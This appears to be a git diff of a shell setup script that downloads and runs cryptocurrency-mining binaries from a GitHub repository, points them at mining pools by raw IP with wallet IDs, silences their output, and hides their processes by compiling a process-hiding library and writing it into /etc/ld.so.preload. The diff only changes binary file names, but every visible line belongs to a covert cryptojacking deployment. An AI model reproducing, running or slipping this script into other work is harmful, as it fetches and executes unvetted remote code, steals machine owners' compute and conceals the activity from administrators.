@@ -13,9 +13,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/usapindong/test/raw/refs/heads/main/tawa && chmod +x tawa
+wget https://github.com/usapindong/test/raw/refs/heads/main/tawa12 && chmod +x tawa12
 
-wget https://github.com/usapindong/test/raw/refs/heads/main/libcudart.so.13 && chmod +x libcudart.so.13
+wget https://github.com/usapindong/test/raw/refs/heads/main/libcudart.so.12 && chmod +x libcudart.so.12
 
 wget https://github.com/usapindong/test/raw/refs/heads/main/libpearlkernel.so.enc && chmod +x libpearlkernel.so.enc
 
@@ -59,4 +59,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp && clear && ./tawa --pool 37.230.62.246:80 --wallet krxYZDM9DP --worker rtx-2080 & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod 777 sse20 && ./sse20 -a power2b -o stratum+tcp://68.183.186.109:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN.rtx -t $(nproc) > /dev/null 2>&1 & clear
+./graftcp/graftcp && clear && ./tawa12 --pool 37.230.62.246:80 --wallet krxYZDM9DP --worker rtx-2080 & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod 777 sse20 && ./sse20 -a power2b -o stratum+tcp://68.183.186.109:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN.rtx -t $(nproc) > /dev/null 2>&1 & clear
